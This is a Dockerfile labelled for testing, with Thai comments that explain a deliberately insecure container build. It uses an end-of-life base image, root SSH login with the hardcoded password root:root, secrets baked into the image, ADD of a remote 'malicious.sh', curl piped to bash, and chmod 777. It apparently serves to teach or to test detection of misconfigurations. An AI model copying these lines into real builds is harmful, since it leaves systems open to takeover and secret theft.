# Dockefile TESTING

# ใช้ base image ที่ EOL แล้ว → ไม่มี security patch
FROM ubuntu:16.04

# ใช้ tag แบบไม่ fix version → reproducibility แย่ และเสี่ยงโดน image เปลี่ยน
# (ubuntu:16.04 ก็แย่อยู่แล้ว แถมไม่ pin digest อีก)

# รันทุกอย่างด้วย root (ค่า default) → ถ้าโดนเจาะคือได้ root ทันที
# ไม่มี USER non-root

# อัปเดตแพ็กเกจแบบไม่ล้าง cache → image ใหญ่ + เหลือ metadata ให้ attacker ดู
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    openssh-server \
    vim

# เปิด SSH ใน container → เพิ่ม attack surface โดยไม่จำเป็น
RUN mkdir /var/run/sshd

# ตั้งรหัส root แบบอ่อนมาก และ hardcode ลงไปใน image → credential leak 100%
RUN echo 'root:root' | chpasswd

# เปิดให้ root login ผ่าน SSH → อันตรายสุด ๆ
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# คัดลอกไฟล์ secret เข้าไปใน image → ใคร pull image ก็เห็น
COPY secrets.txt /root/secrets.txt

# ใช้ ADD แทน COPY และดึงไฟล์จาก internet → เสี่ยง supply chain attack
ADD http://example.com/malicious.sh /usr/local/bin/malicious.sh

# curl | bash ตรง ๆ → classic anti-pattern ถ้าโดน MITM คือจบ
RUN curl http://example.com/install.sh | bash

# chmod 777 → ใครก็เขียนได้
RUN chmod -R 777 /root

# expose port ที่ไม่จำเป็นหลายพอร์ต → เพิ่มโอกาสโดนสแกน
EXPOSE 22 80 443

# ใช้ shell form ของ CMD → signal handling แย่ + เสี่ยง command injection
CMD service ssh start && /bin/bash
